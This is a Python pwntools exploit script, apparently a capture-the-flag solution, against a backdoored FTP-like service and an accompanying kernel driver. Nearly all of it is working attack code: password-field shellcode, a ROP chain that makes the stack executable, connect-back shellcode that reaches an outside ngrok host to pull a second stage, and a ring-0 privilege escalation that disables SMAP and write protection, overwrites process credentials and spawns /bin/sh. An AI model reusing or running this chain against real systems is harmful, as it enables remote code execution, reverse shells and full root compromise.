#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("./i_am_not_backdoor.bin")
context.binary = exe

host = "127.0.0.1"
port = 22222

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

def domain_to_htonl():
    try:
        # Resolve the domain to an IP address
        ip_address = socket.gethostbyname("0.tcp.ap.ngrok.io")
        # Convert the IP address to an integer
        ip_packed = socket.inet_aton(ip_address)
        ip_int = struct.unpack("!L", ip_packed)[0]
        
        # Convert the integer to network byte order
        ip_htonl = socket.htonl(ip_int)
        
        return ip_htonl
    except socket.gaierror:
        return None
    
# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# b *main+1184
# b *0x46e622
# b *0x401d05
gdbscript = '''
start
c
'''.format(**locals())

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

r = start()
r.sendlineafter(b"220 (vsFTPd 2.3.4)", b"")

# SOCKADDR = 0x100007f39050002
# 0x3246 = 12870
SOCKADDR = (domain_to_htonl() << 32) | (0x4632 << 16) | 0x02
LPE_SHELLCODE_ADDR = 0x4A5000
print(f"sockaddr: {hex(SOCKADDR)}")

stage2 = f'''
    mov rax, SYS_socket
    mov rdi, 2          
    mov rsi, 1          
    mov rdx, 0          
    syscall             
    mov rdi, rax        

    mov rax, SYS_connect     
    mov rcx, {SOCKADDR}
    push rcx
    mov rsi, rsp
    mov rdx, 16        
    syscall
    
    mov rax, SYS_read
    mov rdi, 0
    mov rsi, {LPE_SHELLCODE_ADDR}
    mov rdx, {0x2000}
    syscall
    
    push {LPE_SHELLCODE_ADDR}
    ret
'''

r.sendlineafter(b"331 Please specify the password", asm(stage2).ljust(127, b'\x90'))

####################################################################################################
# can't directly send \x0a byte

SYSCALL = 0x42E5D5              # syscall ; ret
POP_RDX = 0x4018e4              # pop rdx ; ret
POP_RDI = 0x4024b8              # pop rdi ; ret
POP_RSI = 0x4097f2              # pop rsi ; ret
ADD_RAX_3 = 0x0000000000455be8  # add rax, 3 ; ret
MOV_RAX_RDX = 0x000000000041d17c # mov rax, rdx ; ret
MOV_QRSI_RDX = 0x46e622         # mov qword ptr [rsi], rdx ; ret

rop  = b''
rop += p64(0x0)                 # rbp

rop += p64(POP_RDX) + p64(0x7)
rop += p64(MOV_RAX_RDX)
rop += p64(ADD_RAX_3)           # SYS_mprotect
rop += p64(POP_RDI) + p64(0x4A5E90 & ~(0xfff))
rop += p64(POP_RSI) + p64(0x1000)
rop += p64(SYSCALL)

rop += p64(POP_RSI) + p64(0x4A5E90) # stack_prot
rop += p64(MOV_QRSI_RDX)
rop += p64(POP_RDI) + p64(0x4A5A38) # stack_end
rop += p64(0x4699D0)            # make_stack_exec
rop += p64(0x4018f4)            # jmp rsp

stage1 = '''
    sub rsp, 0x188
    jmp rsp
'''

l = listen(1337)
r.recvline()
r.recvline()
r.sendline(rop + asm(stage1))
l.wait_for_connection()

DEV_NAME_ADDR = 0x4a5800
USER_DESC_ADDR = 0x4a5900
SELECTOR_ADDR = 0x4a5980
RING0_STAGE2_ADDR = 0x4a5248

MSR_LSTAR = 0xc0000082
KASLR_LSTAR = 0xe00080
KASLR_WRITE_TO = 0xfad000
PTI_SWITCH_MASK = 0x1000

KASLR_INIT_TASK = 0x1c10980
PERCPU_CURRENT = 0x34940
STRUCT_TASK_STRUCT_REAL_CRED = 0x0b80
STRUCT_TASK_STRUCT_CRED = 0x0b88
STRUCT_CRED_USAGE = 0x0

ring0 = f"""
    cli
    mov ecx, {MSR_LSTAR}
    rdmsr
    shl rdx, 32
    or rdx, rax
    sub rdx, {KASLR_LSTAR}
    mov rbp, rdx

    mov r8, cr0
    and r8, ~(1 << 16)
    mov cr0, r8

    mov rdi, rbp
    add rdi, {KASLR_WRITE_TO}
    mov r15, rdi
    mov rsi, {RING0_STAGE2_ADDR}
    mov rcx, 0x200
    
    rep movsb
    
    jmp r15
"""

# stage 2
ring0 += f"""
    swapgs
    
    mov rbx, cr3
    and rbx, {~PTI_SWITCH_MASK}
    mov cr3, rbx
    
    add rdx, {KASLR_INIT_TASK}
    mov rdx, qword ptr [rdx + {STRUCT_TASK_STRUCT_CRED}]
    add qword ptr [rdx + {STRUCT_CRED_USAGE}], 2
    mov rax, gs:{PERCPU_CURRENT}
    mov qword ptr [rax + {STRUCT_TASK_STRUCT_CRED}], rdx
    mov qword ptr [rax + {STRUCT_TASK_STRUCT_REAL_CRED}], rdx
    
    mov rax, gs:{PERCPU_CURRENT}
    mov qword ptr [rax + 0x8], 0
    mov qword ptr [rax + 0xc68], 0
    mov qword ptr [rax + 0xc70], 0
    
    swapgs
    
    or rbx, {PTI_SWITCH_MASK}
    mov cr3, rbx
    
    pop r8
    pop r9
    pushf
    or qword ptr [rsp], {1 << 9}
    push r9
    push r8
    
    iretq
"""

asm_ring0 = asm(ring0)

# setup ldt for bug
kernel_lpe = f"""
    mov r14, 0
    jmp MODIFY_LOOP_CMP
MODIFY_LOOP:
    cmp r14, 0xd
    jz INCREASE_CTR

    mov eax, r14d
    mov rsi, {USER_DESC_ADDR}
    mov dword ptr [rsi], eax
    
    mov rax, SYS_modify_ldt
    mov rdi, 1
    mov rdx, 0x10
    syscall
INCREASE_CTR:
    add r14, 1
MODIFY_LOOP_CMP:
    cmp r14, 0x10
    jle MODIFY_LOOP
"""

# call driver write
kernel_lpe += f"""
    mov rax, SYS_open
    mov rdi, {DEV_NAME_ADDR}
    mov rsi, 2
    mov rdx, 0
    syscall
    
    mov rax, SYS_write
    mov rdi, 1
    mov rsi, 0x4a5900
    mov rdx, 1
    syscall
"""

# mmap 0xc00000
# copy ring0_stage1 to 0xc00000
kernel_lpe += f"""
    mov rax, SYS_mmap
    mov rdi, 0xc00000
    mov rsi, 0x10000
    mov rdx, 0x7
    mov r10, 0x22
    mov r8, -1
    mov r9, 0
    syscall
    
    mov rdi, 0xc00000
    mov rsi, 0x4a5200
    mov rcx, {len(asm_ring0)}
    rep movsb
"""

# disable SMAP
kernel_lpe += f"""
    pushf
    or qword ptr [rsp], 1<<18
    popf
"""

# call gate
kernel_lpe += f"""
    call fword ptr [{SELECTOR_ADDR}]
"""

# return from kernel

kernel_lpe += f"""
    mov rax, SYS_execve
    mov rdi, 0x4a5880
    mov rsi, 0x4a58a0
    mov rdx, 0
    syscall
"""

payload = asm(kernel_lpe)

user_desc_1 = 0x004f001000000000
user_desc_2 = 0x00007fc500000fff
payload = payload.ljust(0x200, b"a") + asm_ring0                                            # 0x4a5200
payload = payload.ljust(0x800, b"a") + b"/dev/i_am_definitely_not_backdoor\x00"             # 0x4a5800
payload = payload.ljust(0x880, b"a") + b"/bin/sh\x00"                                       # 0x4a5880
payload = payload.ljust(0x8a0, b"a") + p64(0x4a5880) + p64(0)                               # 0x4a58a0
payload = payload.ljust(0x900, b"a") + p64(user_desc_1) + p64(user_desc_2)                  # 0x4a5900
payload = payload.ljust(0x980, b"a") + p16(0) + p16(0) + p16((12 << 3) | (1 << 2) | 0x3)    # 0x4a5980

l.send(payload)
l.interactive()

r.close()
l.close()
